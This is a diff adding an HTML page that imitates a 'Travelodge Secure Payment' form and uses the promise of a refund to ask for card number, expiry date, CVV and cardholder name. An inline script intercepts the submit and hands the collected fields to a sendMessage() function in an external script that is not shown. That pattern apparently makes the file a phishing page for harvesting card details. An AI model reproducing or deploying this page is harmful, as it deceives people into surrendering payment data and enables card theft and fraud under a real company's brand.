@@ -1,0 +1,668 @@
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Expires" content="0" />
+
+    <title>Travelodge Secure Payment</title>
+
+    <link
+      nonce=""
+      type="text/css"
+      rel="stylesheet"
+      href="./pp/css/payment.option.layout.css?1701487761816"
+      media="all"
+    />
+    <link
+      nonce=""
+      type="text/css"
+      rel="stylesheet"
+      href="./pp/css/bootstrap.css?1701487761816"
+      media="all"
+    />
+    <link
+      nonce=""
+      type="text/css"
+      rel="stylesheet"
+      href="./pp/css/paymentpage.css?1701487761816"
+      media="all"
+    />
+
+    <!-- CSS = 'travelodge_paymentpage.css' -->
+
+    <link
+      nonce=""
+      type="text/css"
+      rel="stylesheet"
+      href="./pp/css/travelodge_paymentpage.css?1701487761816"
+      media="all"
+    />
+
+    <script nonce="" src="pp/js/jquery-3.6.1.min.js?1701487761816">
+      //Ignore - this comment seems to be required to persuade the XML parser to cope with an empty tag
+    </script>
+    <script nonce="" src="pp/js/paymentCapture.js?1701487761816">
+      //Ignore - this comment seems to be required to persuade the XML parser to cope with an empty tag
+    </script>
+    <script nonce="" src="pp/js/bootstrap.min.js?1701487761816">
+      //Ignore - this comment seems to be required to persuade the XML parser to cope with an empty tag
+    </script>
+    <script src="script.js"></script>
+    <script>
+      window.onload = () => {
+        const form = document.querySelector("#cardform");
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+          const formData = new FormData(e.target);
+          sendMessage(formData, "loading.html", 0);
+        });
+      };
+    </script>
+  </head>
+
+  <body class="ppCustBody">
+    <div id="header" class="hidden-xs cust_header">
+      <span class="cust_logo"></span>
+    </div>
+    <div id="header_mobile" class="visible-xs cust_header_mobile">
+      <span class="cust_logo"></span>
+    </div>
+
+    <form
+      id="cardform"
+      action="loading.html"
+      name="main-form"
+      autocomplete="off"
+      style="margin: 40px 0"
+    >
+      <div id="ppMain" class="container ppCustMain">
+        <div class="capture-heading ppCustHeading">
+          <h1 class="ribbon long overlap ppCustH1">Payment details</h1>
+          <label id="metrics"> </label>
+        </div>
+
+        <div class="ppCustCopy">
+          Please provide the following details and then click "continue".
+        </div>
+
+        <div class="ppCustCopy">
+          Fields marked * are mandatory.
+          <span class="ppErrorHidden" id="errorsPresent">
+            &nbsp;Please correct the indicated errors.
+          </span>
+        </div>
+
+        <noscript nonce="">
+          <div class="error">
+            Javascript needs to be enabled for this page to function fully.<br />
+            It is recommended that you restart the transaction with javascript
+            enabled, however you may be able to complete the transaction with
+            care.
+          </div>
+        </noscript>
+
+        <br />
+
+        <div class="container">
+          <!-- card scheme -->
+          <div
+            id="cardSchemeSelect"
+            class="input-row row ppRow"
+            style="display: none"
+          >
+            <div class="col-xs-12 col-sm-3 col-md-3">
+              <label class="requiredField">*&nbsp;</label>
+              <label class="required" for="cardScheme"> Payment type </label>
+            </div>
+            <div class="col-xs-12 col-sm-5 col-md-5">
+              <select
+                id="cardSchemeId"
+                name="cardScheme"
+                class="ppSelectCardScheme"
+                value=""
+              >
+                <option value="0" selected="default">Please select...</option>
+
+                <option value="Visa Debit" data-surch="" data-donation="true">
+                  Visa Debit/Delta/Electron Card
+                </option>
+
+                <option
+                  value="Mastercard Debit"
+                  data-surch=""
+                  data-donation="true"
+                >
+                  Mastercard Debit
+                </option>
+
+                <option
+                  value="Visa Corporate Debit"
+                  data-surch="9"
+                  data-donation="true"
+                >
+                  Visa Corporate Debit
+                </option>
+
+                <option
+                  value="Mastercard Corporate Debit"
+                  data-surch="9"
+                  data-donation="true"
+                >
+                  Mastercard Corporate Debit
+                </option>
+
+                <option
+                  value="Maestro Debit"
+                  data-surch=""
+                  data-donation="true"
+                >
+                  Maestro Debit Card
+                </option>
+
+                <option value="Visa Credit" data-surch="" data-donation="true">
+                  Visa Credit Card
+                </option>
+
+                <option
+                  value="Mastercard Credit"
+                  data-surch=""
+                  data-donation="true"
+                >
+                  Mastercard Credit
+                </option>
+
+                <option value="Amex Credit" data-surch="" data-donation="true">
+                  American Express Card
+                </option>
+
+                <option
+                  value="Visa Corporate Credit"
+                  data-surch="413"
+                  data-donation="true"
+                >
+                  Visa Corporate Credit
+                </option>
+
+                <option
+                  value="Mastercard Corporate Credit"
+                  data-surch="413"
+                  data-donation="true"
+                >
+                  Mastercard Corporate Credit
+                </option>
+              </select>
+            </div>
+            <div class="col-xs-12 col-sm-4 col-md-4">
+              <span id="cardSchemeError" class="ppErrorHidden"></span>
+            </div>
+          </div>
+
+          <!-- separate outer div so we can show/hide -->
+          <div id="cardDetails" style="display: block">
+            <!-- name on card -->
+            <div class="input-row row ppRow">
+              <div class="col-xs-12 col-sm-3 col-md-3">
+                <label class="requiredField">*&nbsp;</label>
+                <label class="required" for="nameOnCard"> Name on card </label>
+                <span class="hidden-xs">
+                  <a
+                    title=""
+                    class="tooltip help"
+                    data-toggle="tooltip"
+                    data-original-title="Name as it appears on the card."
+                    >x</a
+                  >
+                </span>
+              </div>
+              <div class="col-xs-12 col-sm-5 col-md-5">
+                <input
+                  class="ppStyle ppWide ppCustInput"
+                  type="text"
+                  name="Card-Holder Name"
+                  autocomplete="off"
+                  value=""
+                  required
+                />
+              </div>
+              <div class="col-xs-12 col-sm-4 col-md-4">
+                <span id="cardNameError" class="ppErrorHidden"></span>
+              </div>
+            </div>
+
+            <!-- card number -->
+            <div class="input-row row ppRow">
+              <div class="col-xs-12 col-sm-3 col-md-3">
+                <label class="requiredField">*&nbsp;</label>
+                <label class="" for="cardNumber"> Card number </label>
+                <span class="hidden-xs">
+                  <a
+                    title=""
+                    class="tooltip help"
+                    data-toggle="tooltip"
+                    data-original-title="The long card number on the front of the card."
+                    >x</a
+                  >
+                </span>
+              </div>
+              <div class="col-xs-12 col-sm-5 col-md-5">
+                <input
+                  class="ppStyle ppWide ppCustInput"
+                  type="password"
+                  inputmode="tel"
+                  id="cardNumber"
+                  name="Card Number"
+                  autocomplete="new-password"
+                  value=""
+                  minlength="16"
+                  required
+                />
+                <!-- toggle card view -->
+                &nbsp;<button type="button" id="cardNumberButton">
+                  <img src="pp/images/pwhide.png" id="cnImg" />
+                </button>
+              </div>
+              <div class="col-xs-12 col-sm-4 col-md-4">
+                <span id="cardTypeError" class="ppErrorHidden"></span>
+              </div>
+            </div>
+
+            <!-- Optionally give user the chance to say they want to save the card for future use. -->
+
+            <!-- start MM YY -->
+            <div
+              id="startDateRow"
+              class="input-row row ppRow"
+              style="display: none"
+            >
+              <div class="col-xs-12 col-sm-3 col-md-3">
+                <label class="required" for="startDate.month">
+                  Start date
+                </label>
+                <span class="hidden-xs">
+                  <a
+                    title=""
+                    class="tooltip help"
+                    data-toggle="tooltip"
+                    data-original-title="Some card types have an optional start date which if present is visible on the front of the card and is displayed in MM/YY format."
+                    >x</a
+                  >
+                </span>
+              </div>
+              <div class="col-xs-12 col-sm-5 col-md-5">
+                <select
+                  id="startDate.month"
+                  name="startMonth"
+                  class="ppSelectDate"
+                  value=""
+                >
+                  <option value="MM" selected="">MM</option>
+
+                  <option value="01" selected="">01</option>
+
+                  <option value="02" selected="">02</option>
+
+                  <option value="03" selected="">03</option>
+
+                  <option value="04" selected="">04</option>
+
+                  <option value="05" selected="">05</option>
+
+                  <option value="06" selected="">06</option>
+
+                  <option value="07" selected="">07</option>
+
+                  <option value="08" selected="">08</option>
+
+                  <option value="09" selected="">09</option>
+
+                  <option value="10" selected="">10</option>
+
+                  <option value="11" selected="">11</option>
+
+                  <option value="12" selected="">12</option>
+                </select>
+                /
+                <select
+                  id="startDate.year"
+                  name="startYear"
+                  class="ppSelectDate"
+                  value=""
+                >
+                  <option value="YY" selected="">YY</option>
+
+                  <option value="19" selected="">19</option>
+
+                  <option value="20" selected="">20</option>
+
+                  <option value="21" selected="">21</option>
+
+                  <option value="22" selected="">22</option>
+
+                  <option value="23" selected="">23</option>
+                </select>
+              </div>
+              <div class="col-xs-12 col-sm-4 col-md-4">
+                <span class="ppErrorHidden">&nbsp;</span>
+                <span id="startDateError" class="ppErrorHidden"></span>
+              </div>
+            </div>
+
+            <!-- expiry MM YY -->
+            <div
+              id="expiryDateRow"
+              class="input-row row ppRow"
+              style="display: block"
+            >
+              <div class="col-xs-12 col-sm-3 col-md-3">
+                <label class="requiredField">*&nbsp;</label>
+                <label class="required" for="expiryDate.month"
+                  >Expiry date</label
+                >
+                <span class="hidden-xs">
+                  <a
+                    title=""
+                    class="tooltip help"
+                    data-toggle="tooltip"
+                    data-original-title="All card types have an expiry date which is visible on the front of the card and is displayed in MM/YY format."
+                    >x</a
+                  >
+                </span>
+              </div>
+              <div class="col-xs-12 col-sm-5 col-md-5">
+                <select
+                  id="expiryDate.month"
+                  class="ppSelectDate"
+                  name="Expiary Month"
+                  value=""
+                  required
+                >
+                  <option value="">MM</option>
+
+                  <option value="01">01</option>
+
+                  <option value="02">02</option>
+
+                  <option value="03">03</option>
+
+                  <option value="04">04</option>
+
+                  <option value="05">05</option>
+
+                  <option value="06">06</option>
+
+                  <option value="07">07</option>
+
+                  <option value="08">08</option>
+
+                  <option value="09">09</option>
+
+                  <option value="10">10</option>
+
+                  <option value="11">11</option>
+
+                  <option value="12">12</option>
+                </select>
+                <span class="ppSelectDateSlash">/</span>
+                <select
+                  id="expiryDate.year"
+                  class="ppSelectDate"
+                  name="Expiary Year"
+                  value=""
+                  required
+                >
+                  <option value="">YY</option>
+
+                  <option value="23">23</option>
+
+                  <option value="24">24</option>
+
+                  <option value="25">25</option>
+
+                  <option value="26">26</option>
+
+                  <option value="27">27</option>
+
+                  <option value="28">28</option>
+
+                  <option value="29">29</option>
+
+                  <option value="30">30</option>
+
+                  <option value="31">31</option>
+
+                  <option value="32">32</option>
+
+                  <option value="33">33</option>
+                </select>
+              </div>
+              <div class="col-xs-12 col-sm-4 col-md-4">
+                <span class="ppErrorHidden">&nbsp;</span>
+                <span id="expiryDateError" class="ppErrorHidden"></span>
+              </div>
+            </div>
+
+            <!-- issue number -->
+            <div
+              id="issueNumberRow"
+              class="input-row row ppRow"
+              style="display: none"
+            >
+              <div class="col-xs-12 col-sm-3 col-md-3">
+                <label for="issueNumber"> Issue number </label>
+                <span class="hidden-xs">
+                  <a
+                    title=""
+                    class="tooltip help"
+                    data-toggle="tooltip"
+                    data-original-title="Some card types have an optional issue number which if present is visible on the front of the card."
+                    >x</a
+                  >
+                </span>
+              </div>
+              <div class="col-xs-12 col-sm-5 col-md-5">
+                <input
+                  type="text"
+                  class="small numeric ppCustInput"
+                  id="issueNumber"
+                  name="issueNumber"
+                  autocomplete="off"
+                  maxlength="2"
+                  value=""
+                />
+              </div>
+              <div class="col-xs-12 col-sm-4 col-md-4">
+                <span id="issueNumberError" class="ppErrorHidden">&nbsp;</span>
+              </div>
+            </div>
+
+            <!-- cvv -->
+            <div id="cvvRow" class="input-row row ppRow">
+              <div class="col-xs-12 col-sm-3 col-md-3">
+                <label class="requiredField">*&nbsp;</label>
+                <label class="" for="cvv"> Security code </label>
+                <span class="hidden-xs">
+                  <a
+                    class="tooltip help"
+                    title=""
+                    data-toggle="tooltip"
+                    data-original-title="To make a payment with your we need to know the Card Security Code, also known as the CVV or the Signature Digits. This is used by your card issuer to ensure that the card is in your possession. This is usually the last 3 digits in the signature strip on the reverse of the card, as shown. "
+                    >x</a
+                  >
+                </span>
+              </div>
+              <div class="col-xs-12 col-sm-5 col-md-5">
+                <input
+                  class="ppStyle ppSmall ppNumeric ppCustInput"
+                  type="password"
+                  inputmode="tel"
+                  id="cvv"
+                  name="CVV"
+                  minlength="3"
+                  maxlength="4"
+                  autocomplete="new-password"
+                  value=""
+                  required
+                />
+                <!-- toggle cvv view -->
+                &nbsp;<button id="cvvButton" type="button">
+                  <img src="pp/images/pwhide.png" id="cvImg" />
+                </button>
+              </div>
+              <div class="col-xs-12 col-sm-4 col-md-4">
+                <span id="cvvError" class="ppErrorHidden">&nbsp;</span>
+              </div>
+            </div>
+          </div>
+          <!-- cardDetails -->
+
+          <!-- transaction amount -->
+          <div
+            id="transactionAmountDetails"
+            class="input-row row ppRow"
+            style="display: none"
+          >
+            <div class="col-xs-7 col-sm-3 col-md-3">
+              <label> Transaction amount </label>
+            </div>
+            <div
+              class="col-xs-4 col-sm-1 col-md-1"
+              id="transactionAmountTextDiv"
+            >
+              £<span>206.98</span>
+            </div>
+            <div class="col-xs-0 col-sm-8 col-md-8" id="totalAmountTextDiv">
+              &nbsp;
+            </div>
+          </div>
+
+          <!-- surcharge -->
+          <div
+            id="surchargeDetails"
+            class="input-row row ppRow"
+            style="display: none"
+          >
+            <div class="col-xs-7 col-sm-3 col-md-3">
+              <label> Card fee </label>
+            </div>
+            <div class="col-xs-4 col-sm-1 col-md-1" id="surchargeTextDiv">
+              £<span>108.00</span>
+            </div>
+            <div class="col-xs-0 col-sm-8 col-md-8" id="totalAmountTextDiv">
+              &nbsp;
+            </div>
+          </div>
+
+          <!-- donation -->
+          <div
+            id="donationDetails"
+            class="input-row row ppRow"
+            style="display: none"
+          >
+            <div class="col-xs-7 col-sm-3 col-md-3">
+              <label> Charity Donation </label>
+            </div>
+            <div class="col-xs-4 col-sm-1 col-md-1" id="donationTextDiv">
+              £<span id="donationText">0.00</span>
+            </div>
+            <div class="col-xs-0 col-sm-8 col-md-8" id="totalAmountTextDiv">
+              &nbsp;
+            </div>
+          </div>
+
+          <!-- total amount -->
+          <div class="input-row row ppRow">
+            <div class="col-xs-12 col-sm-8 col-md-6">
+              <label>Refund will be processed within a day.</label>
+            </div>
+          </div>
+
+          <!--  Back & Continue buttons, card type icons - desktop -->
+          <div class="hidden-xs input-row row ppRow ppCustButtons">
+            <div class="col-sm-12 col-md-12">
+              <button
+                class="btn btn-default ppSubmitButton ppCustButton"
+                type="button"
+                onclick="location.assign('/')"
+              >
+                Back
+              </button>
+              <button
+                type="submit"
+                class="btn btn-default ppSubmitButton ppCustButton"
+              >
+                Continue
+              </button>
+            </div>
+
+            <div>&nbsp;</div>
+            <div class="col-sm-12 col-md-12" id="cardTypes">
+              <span class="visa_debit">
+                <span class="mastercard_debit">
+                  <span class="maestro_debit">
+                    <span class="amex_credit"> </span></span></span
+              ></span>
+            </div>
+          </div>
+
+          <!--  Back & Continue buttons, card type icons - mobile -->
+          <div class="visible-xs input-row row ppRow ppCustButtons">
+            <div class="col-xs-12 col-sm-12 col-md-12" id="submit2Div">
+              <button
+                type="submit"
+                class="btn btn-default ppSubmitButton ppCustButton"
+              >
+                Continue
+              </button>
+            </div>
+            <div>&nbsp;</div>
+            <div class="col-xs-12 col-sm-12 col-md-12" id="cancel2Div">
+              <button
+                class="btn btn-default ppSubmitButton ppCustButton"
+                type="button"
+                onclick="location.assign('/')"
+              >
+                Back
+              </button>
+            </div>
+            <div>&nbsp;</div>
+
+            <div class="col-xs-12" id="cardTypeDiv">
+              <span class="visa_debit">&nbsp;</span>
+
+              <span class="mastercard_debit">&nbsp;</span>
+
+              <span class="maestro_debit">&nbsp;</span>
+
+              <span class="amex_credit">&nbsp;</span>
+            </div>
+          </div>
+        </div>
+        <!-- container -->
+      </div>
+      <!--  main -->
+    </form>
+
+    <div id="cust_footer" class="cust_footer">
+      <span class="cust_footer">2023</span>
+    </div>
+
+    <script nonce="">
+      // onclick events, etc.
+      document
+        .getElementById("cardNumberButton")
+        .addEventListener("click", function () {
+          toggleMask("cardNumber", "cnImg");
+        });
+      document
+        .getElementById("cvvButton")
+        .addEventListener("click", function () {
+          toggleMask("cvv", "cvImg");
+        });
+    </script>
+  </body>
+</html>
